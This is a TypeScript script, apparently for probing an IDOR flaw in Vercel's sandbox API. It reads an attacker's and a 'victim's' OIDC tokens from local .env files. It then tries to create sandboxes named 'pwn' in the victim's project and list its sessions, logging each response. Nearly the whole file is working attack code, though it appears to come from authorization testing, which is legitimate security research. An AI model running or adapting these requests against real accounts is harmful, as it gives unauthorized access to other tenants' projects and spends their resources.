import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const ATTACKER = loadEnv("/tmp/vercel-sandbox/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());
const A = JSON.parse(Buffer.from(ATTACKER.split(".")[1], "base64url").toString());

async function call(label: string, token: string, method: string, path: string, query: Record<string, string> = {}, body?: any) {
  const url = new URL("https://vercel.com/api" + path);
  for (const [k, v] of Object.entries(query)) if (v) url.searchParams.set(k, v);
  const r = await fetch(url, {
    method,
    headers: {
      authorization: `Bearer ${token}`,
      "content-type": "application/json",
      "user-agent": `vercel/sandbox/3.0.0 (Node.js/v24; linux/x64)`,
    },
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await r.text();
  console.log(`\n[${r.status}] ${label}`);
  console.log(`  ${method} ${url.pathname}?${url.searchParams}`);
  console.log("  " + (text.length > 500 ? text.slice(0, 500) + "…" : text));
}

async function main() {
  // CONTROLES: atacante en SU proyecto, raw fetch
  await call("CTRL A: raw POST /v3/sandboxes (su project)", ATTACKER, "POST", "/v3/sandboxes", { teamId: A.owner_id },
    { projectId: A.project_id, name: "ctrl-a3", resources: { vcpus: 1 }, timeout: 300000 });
  await call("CTRL A: raw GET /v2 list sessions (su project)", ATTACKER, "GET", "/v2/sandboxes/sessions",
    { project: A.project_id, teamId: A.owner_id, limit: "5" });

  // CROSS-TEAM: atacante crea sandbox en el PROJECT de la víctima
  await call("IDOR: A crea en project VÍCTIMA (teamId=A)", ATTACKER, "POST", "/v3/sandboxes", { teamId: A.owner_id },
    { projectId: V.project_id, name: "pwn-v3", resources: { vcpus: 1 }, timeout: 300000 });
  await call("IDOR: A crea en project VÍCTIMA (teamId=V)", ATTACKER, "POST", "/v3/sandboxes", { teamId: V.owner_id },
    { projectId: V.project_id, name: "pwn-v3b", resources: { vcpus: 1 }, timeout: 300000 });

  // CROSS: listados con project de víctima
  await call("IDOR: A lista sessions de project VÍCTIMA", ATTACKER, "GET", "/v2/sandboxes/sessions",
    { project: V.project_id, teamId: A.owner_id, limit: "5" });
  await call("IDOR: A lista sessions de project VÍCTIMA (teamId=V)", ATTACKER, "GET", "/v2/sandboxes/sessions",
    { project: V.project_id, teamId: V.owner_id, limit: "5" });

  // V2 create viejo cross
  await call("IDOR: A POST /v2/sandboxes project VÍCTIMA", ATTACKER, "POST", "/v2/sandboxes", { teamId: A.owner_id },
    { projectId: V.project_id, name: "pwn-v2", resources: { vcpus: 1 }, timeout: 300000 });

  console.log("\nDONE");
}
main().catch((e) => console.error("ERR", e.message));